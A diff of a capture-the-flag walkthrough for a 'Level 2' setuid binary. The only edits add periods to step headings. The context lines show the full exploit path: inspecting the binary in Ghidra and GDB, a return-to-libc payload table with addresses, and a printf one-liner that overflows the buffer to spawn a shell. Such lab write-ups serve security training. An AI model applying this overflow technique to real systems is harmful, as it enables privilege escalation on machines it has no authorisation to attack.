@@ -1,12 +1,12 @@
 # Level 2 Walkthrough
 
-1. **Connect to the target machine**
+1. **Connect to the target machine.**
 
 	```bash
 	ssh level2@<vm-ip> -p 4242
 	```
 
-2. **Check the files**
+2. **Check the files.**
 
 	```bash
 	ls -l
@@ -18,7 +18,7 @@
 	-rwsr-s---+ 1 level3 users 5138 Mar  6  2016 level2
 	```
 
-3. **Test the binary**
+3. **Test the binary.**
 
 	```bash
 	./level2
@@ -27,13 +27,13 @@
 	It waits for input, echoes the input, and exits..
 
 
-4. **Copy the binary locally for analysis**
+4. **Copy the binary locally for analysis.**
 
 	```bash
 	scp -P 4242 level2@<vm-ip>:/home/user/level2/level2 .
 	```
 
-5. **Disassemble and inspect with Ghidra**
+5. **Disassemble and inspect with Ghidra.**
 
 	The vulnerable function:
 
@@ -46,7 +46,7 @@
 	}
 	```
 
-6. **Inspect in GDB step-by-step**
+6. **Inspect in GDB step-by-step.**
 
 	Launch and break at `main`:
 
@@ -92,7 +92,7 @@
 	* `exit()` address:	`0xb7e5ebe0`
 	* Address after `strdup()`: `0x0804a008` (returns `/bin/sh`)
 
-7. **Construct the payload**
+7. **Construct the payload.**
 
 	Total buffer size:
 
@@ -111,13 +111,13 @@
 	| `0xb7e5ebe0`  | 4     | Address of `exit()`                         |
 	| `0x0804a008`  | 4     | Pointer to `/bin/sh` (return from `strdup`) |
 
-8. **Execute the exploit**
+8. **Execute the exploit.**
 
 	```bash
 	(printf "/bin/sh\x00"; printf 'A%.0s' {1..72}; printf '\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x08\xa0\x04\x08\n'; cat) | ./level2
 	```
 
-9. **Read the password**
+9. **Read the password.**
 
 	```bash
 	whoami
